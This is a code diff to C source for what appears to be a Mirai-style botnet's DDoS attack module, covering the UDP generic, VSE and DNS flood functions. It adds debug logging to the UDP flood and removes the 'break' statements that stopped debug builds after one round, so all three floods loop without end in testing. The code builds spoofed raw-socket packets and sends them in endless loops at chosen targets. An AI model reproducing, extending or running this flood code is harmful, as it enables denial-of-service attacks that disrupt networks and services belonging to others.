@@ -60,16 +60,26 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
+#ifdef DEBUG
+    printf("[UDP_ATTACK] Starting UDP generic attack\n");
+    printf("[UDP_ATTACK] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[UDP_ATTACK] Data len: %u, Sport: %u, Dport: %u\n", (unsigned)data_len, (unsigned)sport, (unsigned)dport);
+    printf("[UDP_ATTACK] IP TOS: %u, TTL: %u, Ident: %u\n", (unsigned)ip_tos, (unsigned)ip_ttl, (unsigned)ip_ident);
+#endif
+
     if (data_len > 1460)
         data_len = 1460;
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
     {
 #ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
+        printf("[UDP_ATTACK] ERROR: Failed to create raw socket (errno=%d). Aborting attack\n", errno);
 #endif
         return;
     }
+#ifdef DEBUG
+    printf("[UDP_ATTACK] Raw socket created successfully (fd=%d)\n", fd);
+#endif
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
     {
@@ -106,6 +116,10 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         udph->len = htons(sizeof (struct udphdr) + data_len);
     }
 
+#ifdef DEBUG
+    printf("[UDP_ATTACK] Starting main attack loop\n");
+    int packet_count = 0;
+#endif
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
@@ -140,10 +154,35 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
             udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
 
             targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            
+#ifdef DEBUG
+            packet_count++;
+            if (packet_count % 1000 == 0) {
+                printf("[UDP_ATTACK] Sent %d packets so far\n", packet_count);
+            }
+            if (packet_count <= 10) {
+                printf("[UDP_ATTACK] Sending packet %d to %u.%u.%u.%u:%u (size=%zu)\n", 
+                       packet_count,
+                       (unsigned char)(targs[i].sock_addr.sin_addr.s_addr & 0xff),
+                       (unsigned char)((targs[i].sock_addr.sin_addr.s_addr >> 8) & 0xff),
+                       (unsigned char)((targs[i].sock_addr.sin_addr.s_addr >> 16) & 0xff),
+                       (unsigned char)((targs[i].sock_addr.sin_addr.s_addr >> 24) & 0xff),
+                       (unsigned)ntohs(targs[i].sock_addr.sin_port),
+                       sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
+            }
+#endif
+            
+            int sent = sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            
+#ifdef DEBUG
+            if (sent == -1) {
+                printf("[UDP_ATTACK] ERROR: sendto failed (errno=%d)\n", errno);
+            } else if (packet_count <= 10) {
+                printf("[UDP_ATTACK] Successfully sent %d bytes\n", sent);
+            }
+#endif
         }
 #ifdef DEBUG
-            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
@@ -244,7 +283,6 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
@@ -389,7 +427,6 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
